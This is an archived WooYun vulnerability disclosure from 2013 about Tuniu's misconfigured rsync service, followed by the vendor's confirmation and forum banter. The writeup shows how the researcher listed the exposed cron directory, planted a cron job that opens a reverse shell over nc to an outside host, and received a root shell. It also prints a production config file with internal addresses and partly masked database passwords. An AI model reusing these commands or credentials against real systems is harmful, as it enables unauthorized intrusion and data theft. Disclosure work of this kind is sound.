{"id": 9365, "wybug_id": "wooyun-2013-034232", "wybug_title": "利用某运维安全缺陷直接获得途牛内网关键业务权限（可留后门可渗透肯定不是struts）", "wybug_corp": "途牛旅游网", "wybug_author": "结界师", "wybug_date": "2013-08-13 12:45", "wybug_open_date": "2013-09-27 12:45", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-27：\t细节向公众公开  简要描述： 利用运维习惯缺陷加上一点点灵感可以直接获得途牛关键业务（非常关键）的系统权限，并且利用该权限可以进行内网渗透 详细说明：  \n{                \"WyVul\": [],                 \"protocol\": \"tcp\",                 \"state\": \"open\",                 \"portid\": \"873\",                 \"Service\": {                    \"method\": \"probed\",                     \"srvName\": \"rsync\",                     \"srvProduct\": \"\",                     \"srvVersion\": \"\"                }            }\n\nrsync boss.tuniu.com::place_photo_new\thotel_photo_new\troute_img_new  \tpic_adv_new    \tprovider       \thtdocs         \tolv            \tcron           \tmnt\n\nrsync boss.tuniu.com::crondrwx------        4096 2013/08/06 21:29:10 .-rw-------           0 2013/03/11 16:42:57 apache-rw-------         214 2011/07/02 15:41:03 heming-rw-------       37776 2013/08/06 21:29:10 root-rw-------       37777 2013/08/06 16:45:22 root.bak_puppet\n激动么激动么，这是神马意思！！\nrsync boss.tuniu.com::cron/root /tmp/rootcat /tmp/root# HEADER: This file was autogenerated at Wed Apr 17 17:48:00 +0800 2013 by puppet.# HEADER: While it can still be managed manually, it is definitely not recommended.# HEADER: Note particularly that the comments starting with 'Puppet Name' should# HEADER: not be deleted, as doing so could cause duplicate cron jobs.#backup bbs#0 0 * * 0 /usr/bin/rsync -tvzrpog --progress 58.68.255.36::mnt_bbs /opt/tuniu/mnt2/bbs --bwlimit=10240-10,30-40 * * * * (/bin/date >> /tmp/133.log; /bin/ps aux| /bin/sort -k 3 -nr| /usr/bin/head >> /tmp/133.log)*/10 * * * * (cd /opt/tuniu/www/crm/scripts/yinfulei/; /opt/tuniu/php/bin/php product_change_price_to_order_compare.php)#0 1 * * *  export dd=`/bin/date --date='today' +'\\%d/\\%b/\\%Y'`; /bin/grep $dd /opt/tuniu/apache2/logs/crm.tuniu.com.log | /bin/grep \"GET /main.php?do=route\" | /bin/awk '{print $2\" \"$5\" \"$7\" \"$8}'> /opt/tuniu/mnt/liuxiaotao.log20 23 * * * export dd=`/bin/date --date='today' +'\\%d/\\%b/\\%Y'`; /bin/grep \"$dd\" /opt/tuniu/apache2/logs/crm.tuniu.com.log | /bin/grep \"main.php?do=route\" | /bin/awk '{print $2\" \"$5\" \"$7\" \"$8}'> /opt/tuniu/mnt/liuxiaotao.log30 23 * * * export dd=`/bin/date --date='today' +'\\%d/\\%b/\\%Y'`; /bin/grep \"$dd\" /opt/tuniu/apache2/logs/crm.tuniu.com.log | /bin/grep \"main.php?do=stock_warning\"| /bin/awk '{print $2\" \"$5\" \"$7\" \"$8}'>> /opt/tuniu/mnt/liuxiaotao.log40 23 * * * export dd=`/bin/date --date='today' +'\\%d/\\%b/\\%Y'`; /bin/grep \"$dd\" /opt/tuniu/apache2/logs/crm.tuniu.com.log | /bin/grep \"main.php?do=p_ticket_clendar_show\"| /bin/awk '{print $2\" \"$5\" \"$7\" \"$8}'>> /opt/tuniu/mnt/liuxiaotao.log\n这是说这位运维把cron目录通过rsync开放了么，如果开放了写权限会如何呢？给它添加\n#OMS-2819*/1 * * * * ( rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc *.wooyun.org 9999 >/tmp/f )\n然后\nrsync /tmp/root root@boss.tuniu.com::cron/root\n没有任何错误，我真是个天才，坐等shell \nnc -l -vv 9999Ncat: Version 6.25 ( http://nmap.org/ncat )Ncat: Listening on :::9999Ncat: Listening on 0.0.0.0:9999Ncat: Connection from 218.94.82.118.Ncat: Connection from 218.94.82.118:28542.sh: no job control in this shellsh-3.2# sh-3.2# iduid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)sh-3.2# uname -aLinux dl486Q13X.tuniu.org 2.6.18-194.el5PAE #1 SMP Fri Apr 2 15:37:44 EDT 2010 i686 i686 i386 GNU/Linuxsh-3.2#\n剩下的就是......   漏洞证明：  \n\n\n<?php//本地数据库配置信息define('DB_HOST', '172.22.0.135');define('DB_PORT', '3306');define('DB_USERNAME', 'boss');define('DB_PASSWORD', 'BoSS[马赛克]Niu');define('DB_SCHEMA', 'crm');//本地数据库只读配置信息define('DB_HOST_RO', '172.22.0.171');#define('DB_HOST_RO', '192.168.1.135');define('DB_PORT_RO', '3306');define('DB_USERNAME_RO', 'boss');define('DB_PASSWORD_RO', 'uinut#133[马赛克]oss#March');#define('DB_PASSWORD_RO', 'uinut#133[马赛克]oss#March');define('DB_SCHEMA_RO', 'crm');//本地只写数据库配置信息define('DB_HOST_WO', '172.22.0.135');define('DB_PORT_WO', '3306');define('DB_USERNAME_WO', 'boss');define('DB_PASSWORD_WO', 'BoS[马赛克]Niu');define('DB_SCHEMA_WO', 'crm');//公网数据库#define('DB_HOST_NET', '114.[马赛克].94');#define('DB_HOST_NET', '58.[马赛克].42');define('DB_HOST_NET', '58.[马赛克].43');define('DB_PORT_NET', '3306');define('DB_USERNAME_NET', 'tuniu');define('DB_PASSWORD_NET', 'Bos[马赛克]#niU');define('DB_SCHEMA_NET', 'tuniu');//本地ICE配置define('ICE_NEED_USE', 1);define('ICE_HOST_ADDRESS', '210.[马赛克]218');define('ICE_HOST_PORT', '10000');// ---------- memcached信息 --------------- //define('MEMCACHED_HOST', '172.22.0.133');define('MEMCACHED_PORT', 11211);define('MEMCACHED_FLAG', false);//define('MEMCACHED_HOST_NET', '210.[马赛克].218');define('MEMCACHED_HOST_NET', '60.[马赛克].121');define('MEMCACHED_PORT_NET', 11211);// --------------知识库搜索用的地址 -------------define('KNOWLEDGE_SEARCH_URL',\"http://172.22.0.133:8080\");//---------------拉卡啦支付地址------------------define('LAKALA_HOST',\"http://218.[马赛克].238:8080\");//---------------e家保险------------------------//define('EJIA_HOST',\"http://www.ejsino.cn:8080\");//define('EJIA_HOST',\"http://203.166.160.178:8080\");define('EJIA_HOST',\"http://www.ejsino.com:8080\");//---------------ABCPDF-Server------------------------define('ABCPDF_HOST',\"http://192.168.1.129:80\");define('ABCPDF_HOST_NET',\"http://222.[马赛克].142:8129\");define('ABCPDF_HOST_LOCAL',\"http://192.168.1.129:80\");define('ABCPDF_DIR',\"abcpdf/PDF/\");define('ABCPDF_PATH',\"pdf\");//----------------CRM-BOSS-SERVER-----------------define('CRM_HOST_IP',\"172.22.0.133\");define('CRM_HOST_PORT',80);define('BOSS_HOST_IP',\"218.[马赛克].238\");define('BOSS_HOST_PORT',80);//---------------FAX - SERVER ---------------------define('FAX_REC_NO',\"025-86853999\");define('FAX_BJ_NO',\"025-86853999\");define('FAX_HZ_NO',\"025-86853999\");//define('FAX_HZ_NO',\"025-86853999\");define('FAX_SZ_NO',\"025-86853999\");define('FAX_SH_NO',\"025-86853999\");define('FAX_TJ_NO',\"025-86853999\");define('FAX_SHZ_NO',\"025-86853999\");define('FAX_CD_NO',\"025-86853999\");define('FAX_WH_NO',\"025-86853999\");//---------------Customer Service Hotline ------------define('PHONE_CUSTOMER_SERVICE_HOTLINE',\"4007-999-999\");//----------------RTX - SERVER ---------------------define('RTX_HOST',\"192.168.1.145\");define('RTX_PORT',\"8012\");define('RTX_URI',\"sendnotify.cgi\");define('RTX_OFFLINE',\"getofflineusers.php\");//----------------SOLR - SERVER --------------------define('SOLR_HOST',\"172.22.0.133\");define('SOLR_PORT',\"8080\");define('SOLR_URI',\"/solr/person\");//----------BOSS WEB 信息 --------------- //define(\"BOSS_HOST\",\"boss.tuniu.com\");define(\"BOSS_PORT\",\"80\");define(\"BOSS_USERNAME\",\"\");define(\"BOSS_PASSWORD\",\"\");//----------FMIS RPC 配置 --------------- //define(\"FMIS2_HOST\",\"fmis2.tuniu.com\");define(\"FMIS2_PORT\",\"80\");define(\"FMIS2_USERNAME\",\"\");define(\"FMIS2_PASSWORD\",\"\");//OA database add by miaochen 2010.07.06define('DB_HOST_OA', '172.22.1.195');define('DB_PORT_OA', '3306');define('DB_USERNAME_OA', 'TuniuOA');define('DB_PASSWORD_OA', 'uinut[马赛克]TuniuOA');define('DB_SCHEMA_OA', 'TuniuOA');define('OA_URL','oa/');//add by miaochendefine('HD_URL','http://helpdesk.tuniu.com/');//TUNIU_INTERFACE_HOSTdefine('TUNIU_INTERFACE_HOST','www.tuniu.com');define('TUNIU_INTERFACE_PORT','80');//定义财务系统绝对地址 added by jibing 2009-08-24define('FMIS_PATH','/opt/tuniu/www/FMIS/');//定义CRM系统绝对地址 added by jibing 2009-08-24define('CRM_PATH','/opt/tuniu/www/crm/');define('FMIS_SWITCH',2);//快捷航空接口信息配置define('KUAIJIEAIR_HOST',\"www.kuaijieair.net\");define('KUAIJIEAIR_PORT',\"80\");define('KUAIJIEAIR_URI',\"jipiao/port/s.php\");define('KUAIJIEAIR_UID',\"798\");//提成和统计数据define('DB_HOST_FMIS_RO', '172.22.1.189');define('DB_PORT_FMIS_RO', '3306');define('DB_USERNAME_FMIS_RO', '[马赛克]');define('DB_PASSWORD_FMIS_RO', 'fb123');define('DB_SCHEMA_FMIS_RO', 'fmis');//呼叫中心数据库define('DB_INFOBIRD_HOST', '172.[马赛克].50');define('DB_INFOBIRD_PORT', '1433');define('DB_INFOBIRD_USERNAME', 'sa');define('DB_INFOBIRD_PASSWORD', '[马赛克]');define('DB_INFOBIRD_SCHEMA', 'infobird');//酒店订单URLdefine('HOTEL_URL','http://crm.tuniu.com/hotelorder');//added by huxiaomin@20110805define('CRM_HOST','crm.tuniu.com');define('FAX_URL','http://fax.tuniu.org/');//add by huxiaomin 2011 08 11 用于传真平台的url//added by huanleG@20111108define('CRM_PORT','80');define('OA_HOST','oa.tuniu.com');\n   修复方案：     版权声明：转载请注明来源 结界师@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-08-13 12:48 厂商回复： 问题确认，感谢@结界师 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-13 12:52 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  结界师又调皮了...前排什么都卖    \n     2013-08-13 12:56 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  卧槽秒确认    \n     2013-08-13 12:58 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  4楼卖身卖肾    \n     2013-08-13 13:32 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  膜拜    \n     2013-08-13 13:35 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @se55i0n 你被楼上诅咒了，晚上一起出来卖吧，卖身卖肾...    \n     2013-08-13 13:53 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @小胖子 卖身不    \n     2013-08-13 13:59 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @淡漠天空 在妓男的眼中，这个世界上没有男人是不卖的，他们对于不卖能理解的上限就是，是不是价钱谈不来。卖可以，WB给够！    \n     2013-08-13 14:01 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  @小胖子 哈哈哈哈哈哈哈！！！卖可以，WB给够！    \n     2013-08-13 17:58 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @小胖子 我靠，才看到：（    \n     2013-09-02 13:14 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  这个牛逼，真心牛逼！！！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}